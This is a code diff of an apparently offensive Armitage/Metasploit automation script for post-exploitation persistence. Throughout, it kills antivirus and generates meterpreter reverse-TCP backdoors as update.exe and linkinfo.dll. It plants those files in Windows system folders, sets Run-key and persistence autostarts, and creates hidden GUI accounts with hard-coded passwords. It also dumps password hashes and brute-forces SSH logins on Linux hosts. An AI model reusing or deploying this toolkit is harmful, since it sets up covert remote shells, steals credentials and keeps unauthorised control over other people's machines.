@@ -1,6 +1,8 @@
 # Script to install/hide a few shells/accounts
 # To Do
+# Add dns server
 # Update hosts file with fake entries to break patching (evil grade?)
+# Author: __int128
 global('%infected');
 $win_user = 'lls_USER';
 $win_pass = '@pplesauc3';
@@ -19,14 +21,21 @@ on session_open {
 				m_cmd($1, "run killav");
 				m_cmd($1, "run metsvc");
 			
-				# Generate Payload
-				$r_lport = random_port();
+				# Generate Payload(s)
 				$win_backdoor = generate("windows/meterpreter/reverse_tcp_allports", lhost(), "20000", %(), "exe");
-				$handle2 = openf(">/tmp/update.exe");
-				writeb($handle2, $win_backdoor);
-	                        closef($handle2);						
+				$handle = openf(">/tmp/update.exe");
+				writeb($handle, $win_backdoor);
+	                        closef($handle);
+				
+				$win2_backdoor = generate("windows/meterpreter/reverse_tcp_allports", lhost(), "30000", %(), "dll");
+				$handle = openf(">/tmp/linkinfo.dll");
+				writeb($handle, $win2_backdoor);
+				closef($handle);				
 					
-				m_cmd($1, "upload /tmp/update.exe c:\\\\Windows\\\\System32\\\\"); 
+				m_cd($1, 'c:\Windows\System32');
+				m_upload($1, "/tmp/update.exe");
+				m_cd($1, 'c:\Windows');
+				m_upload($1, "/tmp/linkinfo.dll");
 				m_cmd($1, "reg setval -k HKLM\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v update -d \"c:\\\\Windows\\\\System32\\\\update.exe\"");
 				m_cmd($1, "run persistence -X -i 60 -p 10000 -r $local_ip");
 				m_cmd($1, "run getgui -u $backdoor_user -p $backdoor_pass");
@@ -38,6 +47,7 @@ on session_open {
 			
 				%infected[session_host($1)] = "1";
 				handler("windows/meterpreter/reverse_tcp_allports", "20000", %(LHOST => lhost()));
+				handler("windows/meterpreter/reverse_tcp_allports", "30000", %(LHOST => lhost()));
 				handler("windows/meterpreter/reverse_tcp", "10000", %(LHOST => lhost()));
        		      		handler("windows/metsvc_bind_tcp", "31337", %(LHOST => lhost(), RHOST => $rhost));
 				m_cmd($1, "run hashdump");
@@ -90,7 +100,7 @@ on session_open {
 				handler("linux/x86/meterpreter/reverse_tcp", $r_lport, %(LHOST => lhost()));
 				auxiliary("scanner/ssh/ssh_login_pubkey", @($rhost), %(USERNAME => 'root', KEY_FILE => '/opt/metasploit/msf3/data/armitage/id_dsa'));
 				login("scanner/ssh/ssh_login", @($rhost), "administrator", "abc123", %(LHOST => lhost(), LPORT => random_port()));
-		
+				
 				# Get hashes
 				launch("post", "linux/gather/hashdump", %(SESSION => "$1")); 
 				db_sync();
@@ -109,7 +119,8 @@ popup host_bottom {
 			if (host_os($1) eq "Microsoft Windows") {
 				handler("windows/meterpreter/reverse_tcp_allports", "20000", %(LHOST => lhost()));
                                 handler("windows/meterpreter/reverse_tcp", "10000", %(LHOST => lhost()));
-                                handler("windows/metsvc_bind_tcp", "31337", %(LHOST => lhost(), RHOST => $rhost));				
+	                       	handler("windows/meterpreter/reverse_tcp_allports", "30000", %(LHOST => lhost()));
+				handler("windows/metsvc_bind_tcp", "31337", %(LHOST => lhost(), RHOST => $rhost));				
 				}
 			if (host_os($1) eq "Linux") {
                                 auxiliary("scanner/ssh/ssh_login_pubkey", @($rhost), %(USERNAME => 'root', KEY_FILE => '/opt/metasploit/msf3/data/armitage/id_dsa'));
@@ -118,4 +129,3 @@ popup host_bottom {
 		}
 	}
 }
-		
